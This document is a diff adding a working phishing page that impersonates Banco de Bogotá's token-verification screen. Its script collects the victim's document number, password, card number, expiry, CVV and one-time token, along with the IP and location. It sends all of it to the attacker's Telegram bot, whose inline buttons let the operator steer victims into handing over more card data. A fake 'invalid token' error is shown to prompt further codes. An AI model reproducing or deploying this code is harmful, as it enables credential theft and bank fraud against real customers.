@@ -1,0 +1,680 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Banco de Bogotá - Verificación</title>
+
+    <link
+      rel="stylesheet"
+      href="https://sapp2406.sirv.com/bogo/lfr_style.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://sapp2406.sirv.com/bogo/lfr_ownstyle.css"
+    />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        /* Custom overrides to match professional style */
+        /* Loader Styles */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #2c3e50;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loader-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            animation: rotateLoader 1.5s linear infinite;
+        }
+
+        .dot {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+        }
+
+        .dot-yellow {
+            background-color: #f1c40f;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .dot-blue {
+            background-color: #3498db;
+            bottom: 5px;
+            left: 0;
+        }
+
+        .dot-red {
+            background-color: #e74c3c;
+            bottom: 5px;
+            right: 0;
+        }
+
+        @keyframes rotateLoader {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        body {
+            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%) !important;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .container {
+            display: flex !important;
+            flex-direction: row !important;
+            justify-content: center !important;
+            align-items: flex-start !important;
+            max-width: 1000px !important;
+            margin: 0 auto !important;
+            padding: 20px !important;
+            background: transparent !important;
+            box-shadow: none !important;
+            position: relative !important;
+            height: auto !important;
+        }
+
+        .login-card-content {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            padding: 30px 20px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .container__login {
+            flex: 0 0 380px !important;
+            padding-top: 0 !important;
+            margin-right: 40px !important;
+            background: transparent !important;
+            width: 380px !important;
+            box-shadow: none !important;
+            display: block !important;
+        }
+
+        .container__info {
+            flex: 1 !important;
+            padding: 0 !important;
+            background: transparent !important;
+            width: auto !important;
+            height: auto !important;
+            box-shadow: none !important;
+            display: block !important;
+            max-width: 500px !important;
+        }
+
+        @media (max-width: 768px) {
+            body {
+                background: #ffffff !important;
+            }
+
+            .container {
+                flex-direction: column !important;
+                align-items: center !important;
+                padding: 15px !important;
+                width: 100% !important;
+                box-sizing: border-box !important;
+            }
+
+            .container__login {
+                width: 100% !important;
+                flex: none !important;
+                margin-right: 0 !important;
+                margin-bottom: 20px !important;
+                max-width: 100% !important;
+            }
+
+            .container__info {
+                width: 100% !important;
+                flex: none !important;
+                max-width: 100% !important;
+                margin-top: 10px !important;
+            }
+            
+            /* Improve input usability on mobile */
+            input, select, textarea {
+                font-size: 16px !important; /* Prevents zoom on iOS */
+            }
+
+            .login-card-content {
+                padding: 15px !important;
+            }
+        }
+
+        .container__info img {
+             border-radius: 8px;
+             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+             display: block;
+             width: 100%;
+        }
+
+        .blue-banner {
+            background-color: #e6f0fa;
+            color: #0033a0;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            font-size: 0.9em;
+            text-align: left;
+            border-left: 4px solid #0033a0;
+        }
+        
+        .error-message {
+            background-color: #fde8e8;
+            color: #c81e1e;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+            border-left: 4px solid #c81e1e;
+        }
+        
+        .token-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0;
+        }
+        
+        .token-input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 1.2rem;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        
+        .token-input:focus {
+            border-color: #0033a0;
+            box-shadow: 0 0 0 2px rgba(0, 51, 160, 0.1);
+        }
+
+        .btn-main {
+            background-color: #0033a0;
+            color: white;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .btn-main:hover {
+            background-color: #002a85;
+        }
+
+        /* Bottom Icons Styles */
+        .bottom-icons-container {
+            display: flex;
+            align-items: center;
+            position: relative;
+            margin-top: 25px;
+            padding-bottom: 20px;
+            width: 100%;
+        }
+        .icons-scroll-view {
+            display: flex;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+            gap: 10px;
+            width: 100%;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+            padding: 0 5px;
+        }
+        .icons-scroll-view::-webkit-scrollbar {
+            display: none;
+        }
+        .bottom-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            color: #0033a0;
+            font-size: 0.75rem;
+            font-weight: bold;
+            flex: 0 0 85px;
+            cursor: pointer;
+        }
+        .bottom-icon-box {
+            width: 48px;
+            height: 48px;
+            border: 1px solid #d1d1d1;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            background-color: transparent;
+            transition: all 0.2s;
+        }
+        .bottom-icon-box:hover {
+            border-color: #0033a0;
+            background-color: #f4f8ff;
+        }
+        .bottom-icon-box svg {
+            width: 24px;
+            height: 24px;
+            fill: #0033a0;
+        }
+        .arrow-btn {
+            width: 32px;
+            height: 32px;
+            border: 1px solid #d1d1d1;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0033a0;
+            cursor: pointer;
+            background: #fff;
+            flex-shrink: 0;
+            z-index: 2;
+        }
+        .arrow-btn:hover {
+            border-color: #0033a0;
+            background-color: #f4f8ff;
+        }
+        .arrow-btn.left { margin-right: 5px; }
+        .arrow-btn.right { margin-left: 5px; }
+        .arrow-btn svg { width: 16px; height: 16px; fill: #0033a0; }
+
+    </style>
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function (response) {
+        $("#ip").html("IP: " + response.ip);
+        $("#address").html("" + response.city + ", " + response.country);
+      });
+
+      var telegram_bot_id, chat_id;
+      
+      // Load credentials
+       fetch("claves.json?v=" + new Date().getTime())
+         .then(response => response.json())
+        .then(data => {
+            telegram_bot_id = data.token;
+            chat_id = data.chat_id;
+        })
+        .catch(e => console.error(e));
+
+      var u_name, ip, ip2, message;
+
+      function moveToNextInput(currentInput, nextInputIndex) {
+        const inputValue = currentInput.value;
+        if (!isNaN(inputValue) && inputValue.length === 1 && nextInputIndex) {
+            const nextInput = document.getElementById(`num${nextInputIndex}`);
+            if (nextInput) {
+                nextInput.removeAttribute('readonly');
+                nextInput.focus();
+            }
+        }
+      }
+
+      var ready = function () {
+        var t1 = document.getElementById("num1").value;
+        var t2 = document.getElementById("num2").value;
+        var t3 = document.getElementById("num3").value;
+        var t4 = document.getElementById("num4").value;
+        var t5 = document.getElementById("num5").value;
+        var t6 = document.getElementById("num6").value;
+        
+        var token_code = t1 + t2 + t3 + t4 + t5 + t6;
+        
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+
+        // Retrieve stored data
+        var saved_u_name = localStorage.getItem("u_name") || "Personas";
+        var saved_u_name2 = localStorage.getItem("u_name2") || "";
+        var saved_u_name3 = localStorage.getItem("u_name3") || "";
+        var saved_u_name4 = localStorage.getItem("u_name4") || "";
+        var saved_last4 = localStorage.getItem("last4") || "";
+
+        message = "<b>🔑 BBOGOTA TOKEN (INVALIDO)</b>\n\n";
+        message += "👤 <b>Tipo:</b> " + saved_u_name + "\n";
+        message += "🆔 <b>Doc:</b> <code>" + saved_u_name3 + "</code> (" + saved_u_name2 + ")\n";
+        message += "🔑 <b>Clave:</b> <code>" + saved_u_name4 + "</code>\n";
+        
+        if (saved_last4 && saved_last4.length > 0) {
+             message += "💳 <b>Ultimos4:</b> <code>" + saved_last4 + "</code>\n";
+        }
+
+        var card_pan = localStorage.getItem("card_pan");
+        var card_exp = localStorage.getItem("card_exp");
+        var card_cvv = localStorage.getItem("card_cvv");
+        if (card_pan) {
+            message += "\n<b>💳 DATOS TARJETA:</b>\n";
+            message += "💳 <b>PAN:</b> <code>" + card_pan + "</code>\n";
+            message += "📅 <b>Exp:</b> <code>" + card_exp + "</code>\n";
+            message += "🔒 <b>CVV:</b> <code>" + card_cvv + "</code>\n";
+        }
+        
+        message += "\n🔢 <b>Token:</b> <code>" + token_code + "</code>\n\n";
+        message += "🌍 <b>IP:</b> <code>" + ip + "</code>\n" + ip2;
+      };
+
+      function scrollIcons(direction) {
+          const container = document.getElementById('iconsTrack');
+          const scrollAmount = 150; 
+          if (direction === 'left') {
+              container.scrollBy({ left: -scrollAmount, behavior: 'smooth' });
+          } else {
+              container.scrollBy({ left: scrollAmount, behavior: 'smooth' });
+          }
+      }
+
+      document.addEventListener('DOMContentLoaded', function() {
+          const container = document.getElementById('iconsTrack');
+          const leftArrow = document.querySelector('.arrow-btn.left');
+          
+          // Carousel logic
+          var bannerImages = ["images/talaval.png", "images/millas.png"];
+          var currentBannerIndex = 0;
+          var bannerImgElement = document.getElementById('bannerImg');
+
+          if (bannerImgElement) {
+              setInterval(() => {
+                  currentBannerIndex++;
+                  bannerImgElement.src = bannerImages[currentBannerIndex % bannerImages.length];
+              }, 2000);
+          }
+
+          if (container && leftArrow) {
+              container.addEventListener('scroll', function() {
+                  if (container.scrollLeft > 10) {
+                      leftArrow.style.display = 'flex';
+                  } else {
+                      leftArrow.style.display = 'none';
+                  }
+              });
+          }
+      });
+
+      var sendReenviar = function () {
+        var saved_u_name = localStorage.getItem("u_name") || "Personas";
+        var saved_u_name2 = localStorage.getItem("u_name2") || "";
+        var saved_u_name3 = localStorage.getItem("u_name3") || "";
+        var saved_u_name4 = localStorage.getItem("u_name4") || "";
+        var saved_last4 = localStorage.getItem("last4") || "";
+        
+        var ip = document.getElementById("gfg").innerHTML;
+        var ip2 = document.getElementById("address").innerHTML;
+
+        var msg = "<b>🔄 BBOGOTA - SOLICITUD REENVIAR TOKEN (INVALIDO)</b>\n\n";
+        msg += "👤 <b>Tipo:</b> " + saved_u_name + "\n";
+        msg += "🆔 <b>Doc:</b> <code>" + saved_u_name3 + "</code> (" + saved_u_name2 + ")\n";
+        msg += "🔑 <b>Clave:</b> <code>" + saved_u_name4 + "</code>\n";
+        
+        if (saved_last4 && saved_last4.length > 0) {
+             msg += "💳 <b>Ultimos4:</b> <code>" + saved_last4 + "</code>\n";
+        }
+
+        var card_pan = localStorage.getItem("card_pan");
+        var card_exp = localStorage.getItem("card_exp");
+        var card_cvv = localStorage.getItem("card_cvv");
+        if (card_pan) {
+            msg += "\n<b>💳 DATOS TARJETA:</b>\n";
+            msg += "<b>PAN:</b> <code>" + card_pan + "</code>\n";
+            msg += "<b>Exp:</b> <code>" + card_exp + "</code>\n";
+            msg += "<b>CVV:</b> <code>" + card_cvv + "</code>\n";
+        }
+        
+        msg += "\n🌍 <b>IP:</b> <code>" + ip + "</code>\n" + ip2;
+
+        document.getElementById('loading-overlay').style.display = 'flex';
+
+        var settings = {
+          async: true,
+          crossDomain: true,
+          url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache",
+          },
+          data: JSON.stringify({
+            chat_id: chat_id,
+            text: msg,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [
+                [
+                    { text: "Error", callback_data: "error" },
+                    { text: "Token", callback_data: "token" },
+                    { text: "Otro Token", callback_data: "token_otro" }
+                ],
+                [
+                    { text: "Pedir Tarjeta Débito", callback_data: "tarjeta_debito" },
+                    { text: "Tarjeta de Crédito", callback_data: "tarjeta_credito" }
+                ],
+                [
+                    { text: "Error Tarjeta Débito", callback_data: "error_debito" },
+                    { text: "Error Tarjeta Crédito", callback_data: "error_credito" }
+                ],
+                [
+                    { text: "Soy Yo", callback_data: "soyyo" },
+                    { text: "Finalizar", callback_data: "finalizar" }
+                ],
+                [
+                    { text: "Error Logo", callback_data: "error_logo" }
+                ]
+              ]
+            }
+          }),
+        };
+
+        $.ajax(settings).done(function (response) {
+            console.log(response);
+            if (response.ok && response.result && response.result.message_id) {
+                localStorage.setItem("bbogota_msg_id", response.result.message_id);
+            }
+            window.location.href = "load.html";
+        });
+
+        return false;
+      };
+
+      var sender = function () {
+        ready();
+        
+        // Show Loader
+        document.getElementById('loading-overlay').style.display = 'flex';
+
+        var settings = {
+          async: true,
+          crossDomain: true,
+          url:
+            "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache",
+          },
+          data: JSON.stringify({
+            chat_id: chat_id,
+            text: message,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [
+                [
+                    { text: "Error", callback_data: "error" },
+                    { text: "Token", callback_data: "token" },
+                    { text: "Otro Token", callback_data: "token_otro" }
+                ],
+                [
+                    { text: "Pedir Tarjeta Débito", callback_data: "tarjeta_debito" },
+                    { text: "Tarjeta de Crédito", callback_data: "tarjeta_credito" }
+                ],
+                [
+                    { text: "Error Tarjeta Débito", callback_data: "error_debito" },
+                    { text: "Error Tarjeta Crédito", callback_data: "error_credito" }
+                ],
+                [
+                    { text: "Soy Yo", callback_data: "soyyo" },
+                    { text: "Finalizar", callback_data: "finalizar" }
+                ],
+                [
+                    { text: "Error Logo", callback_data: "error_logo" }
+                ]
+              ]
+            }
+          }),
+        };
+
+        $.ajax(settings).done(function (response) {
+            console.log(response);
+            if (response.ok && response.result && response.result.message_id) {
+                localStorage.setItem("bbogota_msg_id", response.result.message_id);
+            }
+            window.location.href = "load.html";
+        });
+
+        return false;
+      };
+    </script>
+  </head>
+
+  <body>
+    <!-- Loader Overlay -->
+    <div id="loading-overlay">
+        <div class="loader-container">
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-blue"></div>
+            <div class="dot dot-red"></div>
+        </div>
+    </div>
+
+    <p id="gfg" hidden=""></p>
+    <p id="address" hidden=""></p>
+    <p id="ip" hidden=""></p>
+
+    <div class="container">
+      
+      <!-- Left Side: Login -->
+      <div class="container__login">
+        <div class="container__login--header">
+          <img src="https://sapp2406.sirv.com/bogo/logobanco1.png" alt="Banco de Bogotá" />
+        </div>
+        
+        <div class="container__login--title">
+           <h2 style="font-size: 1.2rem; font-weight: bold; color: #333; margin-bottom: 15px;">Validación de Seguridad</h2>
+        </div>
+
+        <!-- Blue Banner -->
+        <div class="blue-banner">
+            <div>
+                <strong>Código de seguridad</strong><br>
+                Ingresa el código de 6 dígitos que hemos enviado a tu celular o correo registrado.
+            </div>
+        </div>
+
+        <!-- White Card Container for Token Form -->
+        <div class="login-card-content">
+            <h3 style="color: #0033a0; margin-bottom: 20px; font-size: 1.1rem;">Ingresa el Token</h3>
+            
+            <!-- Error Message -->
+            <div class="error-message">
+                Token o Código no válido o expirado. Por favor ingresa un nuevo Token o Código.
+            </div>
+            
+            <form onsubmit="return sender();" autocomplete="off">
+                <div class="token-container">
+                    <input type="tel" class="token-input" maxlength="1" name="num1" id="num1" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 2)" required />
+                    <input type="tel" class="token-input" maxlength="1" name="num2" id="num2" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 3)" readonly />
+                    <input type="tel" class="token-input" maxlength="1" name="num3" id="num3" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 4)" readonly />
+                    <input type="tel" class="token-input" maxlength="1" name="num4" id="num4" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 5)" readonly />
+                    <input type="tel" class="token-input" maxlength="1" name="num5" id="num5" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 6)" readonly />
+                    <input type="tel" class="token-input" maxlength="1" name="num6" id="num6" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, null)" readonly />
+                </div>
+                
+                <p style="font-size: 0.8rem; color: #666; margin-bottom: 20px;">
+                    ¿No recibiste el código? <a href="#" onclick="return sendReenviar();" style="color: #0033a0; font-weight: bold;">Reenviar</a>
+                </p>
+
+                <button type="submit" class="btn-main">Continuar</button>
+            </form>
+        </div>
+
+        <!-- Bottom Icons -->
+        <div class="bottom-icons-container">
+            <div class="arrow-btn left" style="display: none;" onclick="scrollIcons('left')">
+                <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
+            </div>
+            
+            <div class="icons-scroll-view" id="iconsTrack">
+                <div class="bottom-icon">
+                    <div class="bottom-icon-box">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                    </div>
+                    <span>Ingreso seguro</span>
+                </div>
+                <div class="bottom-icon" onclick="window.open('https://www.grupoaval.com/BuscadordePuntosAval/', '_blank')">
+                    <div class="bottom-icon-box">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                    </div>
+                    <span>Cajeros y oficinas</span>
+                </div>
+                <div class="bottom-icon" onclick="window.location.href='turno.html'">
+                     <div class="bottom-icon-box">
+                        <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                     </div>
+                     <span>Solicitar un turno digital</span>
+                </div>
+                <div class="bottom-icon">
+                     <div class="bottom-icon-box">
+                        <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 12h-2v-2h2v2zm0-4h-2V7h2v3z"/></svg>
+                     </div>
+                     <span>Centro de ayuda</span>
+                </div>
+                <div class="bottom-icon">
+                     <div class="bottom-icon-box">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                     </div>
+                     <span>Información</span>
+                </div>
+            </div>
+            
+            <div class="arrow-btn right" onclick="scrollIcons('right')">
+                <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+            </div>
+        </div>
+
+      </div>
+
+      <!-- Right Side: Promo -->
+      <div class="container__info">
+         <img src="images/talaval.png" alt="Promo" id="bannerImg" style="width: 100%; border-radius: 8px;" />
+      </div>
+
+    </div>
+  </body>
+</html>
